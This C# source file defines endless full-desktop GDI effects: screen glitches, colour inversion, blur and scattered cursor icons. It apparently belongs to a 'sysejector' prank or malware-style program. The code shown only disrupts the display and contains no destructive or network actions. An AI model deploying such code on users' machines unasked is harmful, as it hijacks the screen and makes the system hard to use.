using System;
using System.Collections.Generic;
using System.Threading;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using static sysejector.dllimports;
using static sysejector.functions;

namespace sysejector
{
    internal class effects
    {
        public static void glitch()
        {
            int speed = 1500;
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                Color color = Color.FromArgb(r.Next(0, 255), r.Next(0, 255), r.Next(0, 255));
                IntPtr brush = CreateSolidBrush((uint)ColorTranslator.ToWin32(color));
                SelectObject(hdc, brush);

                BitBlt(hdc, r.Next(-10, 10), r.Next(-500, h), w, r.Next(600), hdc, r.Next(-10, 10), r.Next(-500, h), TernaryRasterOperations.PATINVERT);
                Thread.Sleep(speed);
                if (speed > 1200)
                {
                    BitBlt(hdc, r.Next(-10, 10), r.Next(-500, h), w, r.Next(600), hdc, r.Next(-10, 10), r.Next(-500, h), TernaryRasterOperations.SRCPAINT);
                    BitBlt(hdc, r.Next(-10, 10), r.Next(-500, h), w, r.Next(600), hdc, r.Next(-10, 10), r.Next(-500, h), TernaryRasterOperations.SRCAND);
                    speed -= 500;
                }
                ReleaseDC(IntPtr.Zero, hdc);
                DeleteObject(brush);
            }
        }

        public static void rgbquad()
        {
            int speed = 1500;
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr mdc = CreateCompatibleDC(hdc);
                BITMAPINFO bmi = new BITMAPINFO();
                bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(bmi);
                bmi.bmiHeader.biWidth = w;
                bmi.bmiHeader.biHeight = h;
                bmi.bmiHeader.biPlanes = 1;
                bmi.bmiHeader.biBitCount = 32;
                bmi.bmiHeader.biCompression = 0;
                byte[] data = new byte[w * h * 4];
                IntPtr bmp = CreateCompatibleBitmap(hdc, w, h);
                SelectObject(mdc, bmp);

                BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                GetDIBits(hdc, bmp, 0, (uint)h, data, ref bmi, 0);
                int counter = 0;

                for (int y = 0; y < h; y++)
                {
                    for (int x = 0; x < w; x++)
                    {
                        int index = (y * w + x) * 4;

                        data[index + 0] += (byte)(225 + counter);
                        data[index + 1] += (byte)(225 + counter);
                        data[index + 2] += (byte)(225 + counter);
                    }
                }

                counter++;

                SetDIBitsToDevice(hdc, 0, 0, (uint)w, (uint)h, 0, 0, 0, (uint)h, data, ref bmi, 0);
                Thread.Sleep(speed);
                if (speed > 1200)
                {
                    speed -= 500;
                }
                ReleaseDC(IntPtr.Zero, hdc);
                DeleteObject(bmp);
                DeleteDC(mdc);
            }
        }

        public static void blurry()
        {
            int speed = 1000;
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr mdc = CreateCompatibleDC(hdc);
                IntPtr bmp = CreateCompatibleBitmap(hdc, w, h);
                SelectObject(mdc, bmp);

                BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                AlphaBlend(hdc, r.Next(-5, 5), r.Next(-5, 5), w, h, mdc, 0, 0, w, h, new BLENDFUNCTION(0, 0, 100, 0));
                Thread.Sleep(speed);
                if (speed > 500)
                {
                    speed -= 400;
                }
                ReleaseDC(IntPtr.Zero, hdc);
                DeleteObject(bmp);
                DeleteDC(mdc);
            }
        }

        public static void cursors()
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr[] cursors =
                {
                    IDC_APPSTARTING,
                    IDC_ARROW,
                    IDC_CROSS,
                    IDC_HAND,
                    IDC_IBEAM,
                    IDC_NO,
                    IDC_SIZEALL,
                    IDC_SIZENWSE,
                    IDC_SIZENESW,
                    IDC_SIZENS,
                    IDC_SIZEWE,
                    IDC_UPARROW,
                    IDC_WAIT
                };
                DrawIcon(hdc, r.Next(w), r.Next(h), cursors[r.Next(cursors.Length)]);
                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(10);
            }
        }
    }
}